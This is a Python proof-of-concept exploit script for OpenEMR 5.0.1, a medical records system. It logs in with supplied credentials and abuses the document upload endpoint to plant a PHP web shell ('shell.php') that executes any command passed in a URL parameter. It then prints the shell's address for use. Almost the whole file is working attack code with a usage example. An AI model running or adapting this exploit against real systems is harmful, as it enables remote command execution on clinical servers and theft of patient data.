#!/usr/bin/python3
#EmreOvunc
#OpenEMR 5.0.1 - File Upload to Remote Code Execution Exploit
from requests import Session
from argparse  import ArgumentParser

parser = ArgumentParser()
parser.add_argument('--target',   '-t', help='give OpenEMR URL')
parser.add_argument('--username', '-u', help='give OpenEMR username')
parser.add_argument('--password', '-p', help='give OpenEMR password')

args = parser.parse_args()


uploaddata = """
-----------------------------396360671439393218101595080193
Content-Disposition: form-data; name="MAX_FILE_SIZE"

64000000
-----------------------------396360671439393218101595080193
Content-Disposition: form-data; name="file[]"; filename="shell.php"
Content-Type: text/php

<?php
if($_GET['cmd']) {
  system($_GET['cmd']);
  }
?>
-----------------------------396360671439393218101595080193
Content-Disposition: form-data; name="destination"


-----------------------------396360671439393218101595080193
Content-Disposition: form-data; name="patient_id"

00
-----------------------------396360671439393218101595080193
Content-Disposition: form-data; name="category_id"

4
-----------------------------396360671439393218101595080193
Content-Disposition: form-data; name="process"

true
-----------------------------396360671439393218101595080193--
"""

phpshell = """ 
            <?php
            if($_GET['cmd']) {
                system($_GET['cmd']);
                }
            ?>
            """


def getlogin(target, s, headers, creds):
    res = s.post(target + "/interface/main/main_screen.php?auth=login&site=default", data=creds, headers=headers, verify=False)
    if 'Set-Cookie' in res.headers:
        print('[-]Invalid credentials!')
        exit()
    else:
        print('[+]Successfully logged in.')


def uploadShell(target, s, header, data):
    res = s.post(target + "/controller.php?document&upload&patient_id=00&parent_id=4&", headers=header, data=data)
    if "sites/default/documents/00" in res.content.decode():
        spath = res.content.decode().split('sites/default/documents/00')[1].split('<br>')[0]
        print('[+]Shell Uploaded.')
        print('Go to: ' + target + "/sites/default/documents/00" + spath + "?cmd=whoami")
    else:
        print('[-]ERROR')


print('[!]OpenEMR 5.0.1 Remote Code Execution Exploit')

if args.target is not None and args.username is not None and args.password is not None:
    target = args.target

    headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0",
               "Origin": target,
               "Referer": target + "/interface/login/login.php?site=default",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
               "Accept-Language": "en-US,en;q=0.5",
               "Accept-Encoding": "gzip, deflate",
               }

    uploadheaders = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0",
                     "Origin": target,
                     "Referer": target + "/controller.php?document&upload&patient_id=00&parent_id=4&",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                     "Accept-Language": "en-US,en;q=0.5",
                     "Accept-Encoding": "gzip, deflate",
                     "Content-Type": "multipart/form-data; boundary=---------------------------396360671439393218101595080193",
                     }

    creds = {"new_login_session_management": "1",
             "authProvider": "Default",
             "authUser": args.username,
             "clearPass": args.password,
             "languageChoice": "1"
             }

else:
    print("""
usage: openemr_rce_poc.py [-h] [--target TARGET]

optional arguments:
  -h, --help            show this help message and exit
  --target TARGET, -t TARGET
                        give OpenEMR URL
                        
Example: python3 openemr_rce_poc.py -t http://127.0.0.1/openemr/ -u admin -p Passw0rd
""")
    exit()

s = Session()
getlogin(target, s, headers, creds)
uploadShell(target, s, uploadheaders, uploaddata)
